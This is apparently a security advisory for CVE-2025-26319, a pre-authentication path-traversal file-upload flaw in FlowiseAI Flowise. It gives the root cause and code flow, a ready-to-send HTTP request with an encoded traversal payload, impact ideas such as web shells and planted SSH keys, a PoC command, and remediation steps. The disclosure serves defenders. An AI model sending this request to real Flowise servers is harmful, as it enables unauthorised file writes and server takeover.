# CVE-2025-26319 Vulnerability Report

## Overview

| Item | Description |
|------|-------------|
| CVE ID | CVE-2025-26319 |
| CWE | CWE-434 (Unrestricted Upload of File with Dangerous Type) |
| CVSS | 9.8 (Critical) |
| Affected | FlowiseAI Flowise v2.2.6 and earlier |
| Endpoint | /api/v1/attachments/:chatflowId/:chatId |

## Vulnerability Description

FlowiseAI Flowise v2.2.6 contains an arbitrary file upload vulnerability in the `/api/v1/attachments` endpoint. The `chatId` parameter is not validated for path traversal sequences, allowing unauthenticated attackers to upload files to arbitrary locations on the server filesystem.

## Technical Analysis

### Root Cause

The `/api/v1/attachments/:chatflowId/:chatId` endpoint is whitelisted for unauthenticated access. When processing file uploads:

1. The `chatflowId` and `chatId` parameters are extracted from the URL without proper validation
2. The file storage path is constructed by joining: `{storage_path}/{chatflowId}/{chatId}/{filename}`
3. The `chatId` parameter can contain URL-encoded path traversal sequences (e.g., `..%2F`)
4. This allows attackers to write files to arbitrary directories

### Vulnerable Code Flow

```
/api/v1/attachments/:chatflowId/:chatId
    -> createFileAttachment()
    -> addArrayFilesToStorage(mime, buffer, filename, fileNames, chatflowid, chatId)
    -> path.join(getStoragePath(), ...paths)  // paths = [chatflowid, chatId]
```

## Exploitation

### Attack Steps

1. Send POST request to `/api/v1/attachments/{chatflowId}/{traversal_path}`
2. Use URL-encoded path traversal in `chatId`: `..%2F..%2F..%2F..%2F..%2Ftmp`
3. Upload arbitrary file content with desired filename
4. File is written to traversed path

### HTTP Request Example

```http
POST /api/v1/attachments/test/..%2F..%2F..%2F..%2F..%2Ftmp HTTP/1.1
Host: localhost:3000
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="files"; filename="malicious.txt"
Content-Type: text/plain

Arbitrary file content
------boundary--
```

## Impact

- **Remote Code Execution**: Upload web shells or malicious scripts
- **Configuration Tampering**: Overwrite api.json to inject API keys
- **Data Corruption**: Overwrite critical application files
- **Privilege Escalation**: Write SSH keys or cron jobs
- **Denial of Service**: Overwrite essential system files

## Verification

```bash
# Run the PoC
python poc.py -u http://localhost:3000

# Verify in container
docker exec flowise-vuln ls -la /tmp/
```

## Remediation

1. Validate `chatId` parameter to ensure it's a valid UUID
2. Use path canonicalization to prevent traversal
3. Implement allowlist for upload directories
4. Move endpoint out of whitelist to require authentication

## References

- https://nvd.nist.gov/vuln/detail/CVE-2025-26319
- https://medium.com/@attias.dor/the-burn-notice-part-2-5-5-flowise-pre-auth-arbitrary-file-upload-cve-2025-26319-0d4194a34183
- https://github.com/dorattias/CVE-2025-26319
